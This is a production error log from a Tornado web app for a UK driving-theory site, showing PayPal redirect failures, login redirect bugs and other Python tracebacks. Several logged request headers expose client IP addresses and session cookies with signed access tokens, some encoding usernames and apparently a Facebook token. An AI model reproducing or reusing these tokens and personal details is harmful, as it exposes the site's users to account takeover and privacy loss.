WARNING:intheory-8002:Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: u'This transaction cannot be processed. The amount to be charged is zero.' (Error Code: 10525)
ERROR:root:Uncaught exception GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/payment', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token="R2lvcmdvcw==|1350934729|d1b5f7994548413ab823c784e6f41dbc54086a75"; user_type="aW50aGVvcnk=|1350934729|a221106d34e4f7d58f020af2221aa19a1aa7221b"; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.51.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 2 arguments (1 given)
ERROR:root:500 GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1) 965.72ms
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: Unknown format code 'f' for object of type 'str'
WARNING:intheory-8000:Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: Unknown format code 'f' for object of type 'str'
ERROR:root:Uncaught exception GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/payment', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token="R2lvcmdvcw==|1350934729|d1b5f7994548413ab823c784e6f41dbc54086a75"; user_type="aW50aGVvcnk=|1350934729|a221106d34e4f7d58f020af2221aa19a1aa7221b"; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.56.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 2 arguments (1 given)
ERROR:root:500 GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1) 25.14ms
Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: Unknown format code 'f' for object of type 'str'
WARNING:intheory-8003:Error while redirecting user with id 5085a0c98e4c85424275f05a to PayPal: Unknown format code 'f' for object of type 'str'
ERROR:root:Uncaught exception GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/payment', 'X-Real-Ip': '86.167.54.3', 'Cookie': '_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5; access_token="R2lvcmdvcw==|1350934729|d1b5f7994548413ab823c784e6f41dbc54086a75"; user_type="aW50aGVvcnk=|1350934729|a221106d34e4f7d58f020af2221aa19a1aa7221b"; __utma=188782963.489109469.1349903373.1350910182.1350930463.25; __utmb=188782963.56.10.1350930463; __utmc=188782963; __utmz=188782963.1349903373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 2 arguments (1 given)
ERROR:root:500 GET /payment/redirect?code=CRXWOAWE&_xsrf=e8ef016bea9b4fd1b0e3ed45ff4957c5 (127.0.0.1) 19.63ms
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Intheory user with id 5085a4cb8e4c85471814a836 has successfully registered.
INFO:intheory-8001:Intheory user with id 5085a4cb8e4c85471814a836 has successfully registered.
User with id 5085a4cb8e4c85471814a836has paid. The transaction id is Free voucher transaction
INFO:intheory-8000:User with id 5085a4cb8e4c85471814a836has paid. The transaction id is Free voucher transaction
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Intheory user with id 5085a7618e4c85480a03f9d0 has successfully registered.
INFO:intheory-8002:Intheory user with id 5085a7618e4c85480a03f9d0 has successfully registered.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Intheory user with id 5085a7618e4c85480a03f9d0 has successfully logged in.
INFO:intheory-8003:Intheory user with id 5085a7618e4c85480a03f9d0 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5085ac178e4c854813486e5d has successfully logged in.
INFO:intheory-8003:Facebook user with id 5085ac178e4c854813486e5d has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Intheory user with id 5085c0dc8e4c854813486e60 has successfully registered.
INFO:intheory-8003:Intheory user with id 5085c0dc8e4c854813486e60 has successfully registered.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (84.241.100.26) 0.90ms
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.83ms
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.80ms
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 5086785d8e4c85500b6cc27e has successfully logged in.
INFO:intheory-8001:Facebook user with id 5086785d8e4c85500b6cc27e has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
Facebook user with id 5086785d8e4c85500b6cc27e has successfully logged in.
INFO:intheory-8000:Facebook user with id 5086785d8e4c85500b6cc27e has successfully logged in.
Intheory user with id 508679408e4c85501c5038b1 has successfully registered.
INFO:intheory-8003:Intheory user with id 508679408e4c85501c5038b1 has successfully registered.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8003:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
intro is not a valid ObjectId
WARNING:intheory-8001:intro is not a valid ObjectId
ERROR:root:Uncaught exception POST /learn/hazard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%2272.451678%22%5D&cid=intro&_xsrf=66ceaf72bf63435789d598fcc8f04488', headers={'Content-Length': '78', 'Accept-Language': 'en-gb,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '86.166.9.139', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0', 'Host': 'www.intheory.co.uk', 'Cookie': '_xsrf=66ceaf72bf63435789d598fcc8f04488; __utma=188782963.1961707664.1350989694.1350989694.1350989694.1; __utmb=188782963.11.10.1350989694; __utmc=188782963; __utmz=188782963.1350989694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test; access_token="QUFBRzZsTmNzNkdjQkFMOFpDM3JhdDM1TWJPTU5qVnpBSU0wMkZBVGxJSFhyVjhIY2hvYlNteU9SWXhEclNudnF4NU5PQ3ptb1VaQkFYWWdvYzk3RG9hMWZOSnhDaFpBeDFFWEhWbnVOZ1pEWkQ=|1350989827|8b589f5b0f380be527c7e660eda3dd4a763c5e5a"; user_type="ZmI=|1350989827|fb2a282ab78155050e7792edaeb579b231e02cb5"', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Referer': 'http://www.intheory.co.uk/learn/hazard/clip/intro', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazard/evaluate (127.0.0.1) 58.14ms
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8003:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8000:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8003:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8002:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Intheory user with id 508679e78e4c855002dbfdb7 has successfully registered.
INFO:intheory-8001:Intheory user with id 508679e78e4c855002dbfdb7 has successfully registered.
Intheory user with id 508679e78e4c855002dbfdb7 has successfully logged in.
INFO:intheory-8002:Intheory user with id 508679e78e4c855002dbfdb7 has successfully logged in.
Intheory user with id 50867a838e4c8550017ec561 has successfully registered.
INFO:intheory-8000:Intheory user with id 50867a838e4c8550017ec561 has successfully registered.
global name 'math' is not defined
WARNING:intheory-8001:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%229.53710651397705%22%2C%2213.459396362304687%22%5D&cid=507493338e4c850ece772bcb&_xsrf=c3d7a8ecc888405aa53db4d358618391', headers={'Content-Length': '131', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'X-Real-Ip': '82.26.20.164', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bcb', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=c3d7a8ecc888405aa53db4d358618391; access_token="bmFtcmF0YXBhbmNoYWw=|1350990467|1aa866f0930501e6c4efc34feb82acd22cf0592c"; user_type="aW50aGVvcnk=|1350990467|95fbe991efc2551f2bcdd55d7f15ec43d778dd17"; __utma=188782963.1035559990.1350990377.1350990377.1350990377.1; __utmb=188782963.9.10.1350990377; __utmc=188782963; __utmz=188782963.1350990377.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=hazard%20perception%20test%20free'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 15.07ms
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8000:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 3.21ms
Intheory user with id 50867b1b8e4c855002dbfdba has successfully registered.
INFO:intheory-8001:Intheory user with id 50867b1b8e4c855002dbfdba has successfully registered.
Intheory user with id 50867b1e8e4c85501c5038b6 has successfully registered.
INFO:intheory-8003:Intheory user with id 50867b1e8e4c85501c5038b6 has successfully registered.
'NoneType' object has no attribute 'id'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 157, in on_get
    self.log.warning("Error while redirecting user with id " + str(self.current_user.id) + " to PayPal: " + str(e))
AttributeError: 'NoneType' object has no attribute 'id'
ERROR:intheory-8002:'NoneType' object has no attribute 'id'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/payments.py", line 157, in on_get
    self.log.warning("Error while redirecting user with id " + str(self.current_user.id) + " to PayPal: " + str(e))
AttributeError: 'NoneType' object has no attribute 'id'
ERROR:root:500 GET /payment/redirect (127.0.0.1) 12.97ms
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8001:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 6.48ms
global name 'math' is not defined
WARNING:intheory-8003:global name 'math' is not defined
ERROR:root:Uncaught exception POST /learn/hazardboard/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/learn/hazardboard/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='answers=%5B%222.5412518978118896%22%2C%2210.349419593811035%22%2C%2215.437158584594726%22%2C%2216.119020462036133%22%2C%2216.630868911743164%22%2C%2233.579978942871094%22%5D&cid=507493338e4c850ece772bcf&_xsrf=4cf30d8222904ed18a30c72d20e9e732', headers={'Content-Length': '241', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; BOIE9;ENGB)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Ua-Cpu': 'AMD64', 'Cache-Control': 'no-cache', 'X-Real-Ip': '2.103.208.248', 'Referer': 'http://www.intheory.co.uk/learn/hazardboard/clip?cid=507493338e4c850ece772bcf', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=4cf30d8222904ed18a30c72d20e9e732; access_token="Ym90YW4=|1350990619|4037e4c7cd4b323ba0b77d7a2dca6bbc8231af54"; user_type="aW50aGVvcnk=|1350990619|74365f038f56cb6b1b5b8a774292b3ae63a2cb05"; __utma=188782963.1909822078.1350990547.1350990547.1350990547.1; __utmb=188782963.12.10.1350990547; __utmc=188782963; __utmz=188782963.1350990547.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=Driving%20Test%20Complete%3A%20Hazard%20Perception%20Test'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 6 arguments (1 given)
ERROR:root:500 POST /learn/hazardboard/evaluate (127.0.0.1) 15.86ms
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Intheory user with id 50867b1e8e4c85501c5038b6 has successfully logged in.
INFO:intheory-8000:Intheory user with id 50867b1e8e4c85501c5038b6 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8002:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 20.22ms
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8003:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/payment (127.0.0.1) 6.43ms
Intheory user with id 50867d088e4c85500b6cc285 has successfully registered.
INFO:intheory-8002:Intheory user with id 50867d088e4c85500b6cc285 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Intheory user with id 50867d2b8e4c8550017ec566 has successfully registered.
INFO:intheory-8000:Intheory user with id 50867d2b8e4c8550017ec566 has successfully registered.
Intheory user with id 50867d518e4c8550017ec568 has successfully registered.
INFO:intheory-8000:Intheory user with id 50867d518e4c8550017ec568 has successfully registered.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
WARNING:root:404 GET // (127.0.0.1) 0.82ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 131, in _on_login
    self.redirect("/dashboard")
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 459, in redirect
    raise Exception("Cannot redirect after headers have been written")
Exception: Cannot redirect after headers have been written
'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:intheory-8000:'NoneType' object has no attribute 'lower'
Traceback (most recent call last):
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 196, in _execute_request
    result = fn(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 296, in on_post
    user = User.objects(username=username.lower()).get()
AttributeError: 'NoneType' object has no attribute 'lower'
ERROR:root:500 POST /login/intheory?next=/dashboard (127.0.0.1) 2.98ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
